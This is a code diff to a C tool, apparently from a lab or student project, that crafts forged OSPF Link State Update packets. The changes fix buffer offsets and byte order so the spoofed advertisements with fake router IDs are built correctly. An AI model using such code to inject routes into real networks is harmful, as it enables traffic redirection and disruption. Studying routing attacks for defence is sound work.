@@ -82,7 +82,7 @@ int attack_write_ls_update(unsigned char buffer[BUFFER_LEN], unsigned char *loca
 
   // OSPF sections of the packet
   int ospf_len = 0;
-  ospf_len += ospf_write_ls_update(ospf_buffer_ptr, local_ip);
+  ospf_len += ospf_write_ls_update(ospf_buffer_ptr + sizeof(struct ospf_header), local_ip);
   ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, ospf_len, OSPF_LSUPDATE_T);
 
   // IP header
@@ -141,12 +141,12 @@ int ospf_write_ls_update(unsigned char *buffer, char *local_ip) {
   int length = 0;
   // OSPF Link State Update
   struct ospf_lsu *lsu_header_ospf = (struct ospf_lsu *) buffer;
-  lsu_header_ospf->lsu_nads = inet_addr("0.0.0.1");                         /* # Advertisments This Packet  */
+  lsu_header_ospf->lsu_nads = htonl(1); /* # Advertisments This Packet  */
   length += sizeof(struct ospf_lsu);
 
   // OSPF link state summary header
-  struct ospf_lss *lss_header_ospf = (struct ospf_lss *) buffer + length;
-  lss_header_ospf->lss_age = LSS_AGE;                                       /* Time (secs) Since Originated ?pedro I can't know if fixed value */
+  struct ospf_lss *lss_header_ospf = (struct ospf_lss *) (buffer + length);
+  lss_header_ospf->lss_age = htons(LSS_AGE);                                /* Time (secs) Since Originated */
   lss_header_ospf->lss_opts = LSS_OPTIONS;                                  /* Options Supported */
   lss_header_ospf->lss_type = LSST_ROUTE;                                   /* LST_* below ?pedro */
   lss_header_ospf->lss_lsid = inet_addr(local_ip);                          /* Link State Identifier */
@@ -157,7 +157,7 @@ int ospf_write_ls_update(unsigned char *buffer, char *local_ip) {
   length += sizeof(struct ospf_lss);
 
   // OSPF Network Links Advertisement
-  struct  ospf_na *na_header_ospf = (struct ospf_na *) buffer + length;
+  struct  ospf_na *na_header_ospf = (struct ospf_na *) (buffer + length);
   na_header_ospf->na_mask = inet_addr("255.0.0.0");                         /* Network Mask     */
   na_header_ospf->na_rid[0] = inet_addr("200.0.0.1");                       /* ID of first  Attached Routers  */
   na_header_ospf->na_rid[1] = inet_addr("100.0.0.1");                       /* ID of second Attached Routers  */
